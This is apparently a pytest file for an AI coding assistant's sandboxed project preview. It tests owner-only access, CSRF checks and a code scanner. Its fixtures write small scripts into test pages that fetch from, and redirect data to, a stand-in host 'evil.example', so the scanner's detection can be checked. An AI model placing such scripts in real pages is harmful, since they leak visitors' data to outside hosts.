"""Vista previa del codificador: la ruta del dueño (sesión + CSRF; ajeno = inexistente = 404) y la herramienta
preview_project (enlace al sandbox + análisis del código). Sin tokens: modelo falso."""
from fastapi.testclient import TestClient
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.store.memory import InMemoryStore

from assistant.core.agent import build_agent
from assistant.core.coder.memory import MemoryCoderRepo
from assistant.core.coder.projects import Projects
from assistant.core.profile import load_profile
from assistant.packs.tools.coder import make_coder_tools
from conftest import _settings, build_test_agent, fake_llm, run_turn, tool_call, uid

ORIGIN = {"Origin": "http://testserver"}
PW = "contraseña-larga-1"
CODER = dict(auth_enabled=True, coder_enabled=True, trusted_hosts=("127.0.0.1", "testserver"))


def _app():
    from assistant.core import server
    from assistant.core.appdata.memory import MemoryAppData

    s = _settings(**CODER)
    appdata = MemoryAppData()
    app = server.create_app(agent=build_test_agent(["x"], s, checkpointer=InMemorySaver()), settings=s,
                            store=InMemoryStore(), appdata=appdata)
    return app, appdata


def _login(app, email):
    c = TestClient(app, headers=ORIGIN)
    r = c.post("/auth/register", json={"email": email, "password": PW, "display_name": "U"})
    c.headers["X-CSRF-Token"] = r.json()["csrf"]
    return c


def test_ruta_del_dueno():
    app, appdata = _app()
    a, b = _login(app, "ana@ejemplo.com"), _login(app, "beto@ejemplo.com")
    ana = appdata.users.get_by_email("ana@ejemplo.com")["user_id"]
    projects = app.state.coder
    pid = projects.create(ana, "landing")["project_id"]
    projects.write_file(ana, pid, "index.html", "<script>fetch('https://evil.example')</script>")
    r = a.post(f"/coder/projects/{pid}/preview")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["url"].startswith("http://127.0.0.2:8100/p/") and body["url"].endswith("/")
    assert body["version"] == 1 and body["expires"]
    assert [f["code"] for f in body["findings"]] == ["external_request"]
    token = body["url"].split("/p/")[1].rstrip("/")
    assert projects.resolve_preview(token) == {"project_id": pid, "version": 1}
    # ajeno = inexistente; sin CSRF, 403; sin sesión, 401
    ajeno = b.post(f"/coder/projects/{pid}/preview")
    inexistente = a.post("/coder/projects/p_000000000000/preview")
    assert ajeno.status_code == inexistente.status_code == 404 and ajeno.json() == inexistente.json()
    assert ajeno.json() == {"detail": "No existe ese proyecto."}
    sin_csrf = TestClient(app, headers=ORIGIN, cookies=a.cookies)
    assert sin_csrf.post(f"/coder/projects/{pid}/preview").status_code == 403
    assert TestClient(app, headers=ORIGIN).post(f"/coder/projects/{pid}/preview").status_code == 401


def test_herramienta_preview_project():
    s = _settings(model_call_limit=0, **CODER)
    projects = Projects(MemoryCoderRepo(), s)
    pid = projects.create("u", "x")["project_id"]
    projects.write_file("u", pid, "index.html", "<h1>x</h1><script>location.href='https://evil.example/?d='+x"
                                                "</script>")
    llm = fake_llm(tool_call("preview_project", {"project_id": pid}), "ok")
    agent = build_agent(llm, make_coder_tools(s, projects), s, checkpointer=InMemorySaver(),
                        profile=load_profile("default"))
    end = next(e for e in run_turn(agent, s, "x", uid(), user_id="u") if e["type"] == "tool_end")
    assert end["status"] == "success"
    out = end["output"]
    assert "Preview of project " + pid + ", version 1: http://127.0.0.2:8100/p/" in out
    assert "Code check: 1 blocking" in out and "navigates the page to another site" in out
    # sin index.html avisa; de otro usuario, Not run
    pid2 = projects.create("u", "y")["project_id"]
    projects.write_file("u", pid2, "app.js", "1")
    llm = fake_llm(tool_call("preview_project", {"project_id": pid2}), tool_call("preview_project", {"project_id": pid},
                                                                                 "c2"), "ok")
    agent = build_agent(llm, make_coder_tools(s, projects), s, checkpointer=InMemorySaver(),
                        profile=load_profile("default"))
    ends = [e for e in run_turn(agent, s, "x", uid(), user_id="u") if e["type"] == "tool_end"]
    assert "has no index.html" in ends[0]["output"]
    agent = build_agent(fake_llm(tool_call("preview_project", {"project_id": pid}), "ok"), make_coder_tools(s, projects),
                        s, checkpointer=InMemorySaver(), profile=load_profile("default"))
    end = next(e for e in run_turn(agent, s, "x", uid(), user_id="otro") if e["type"] == "tool_end")
    assert end["status"] == "skipped" and "http" not in end["output"]
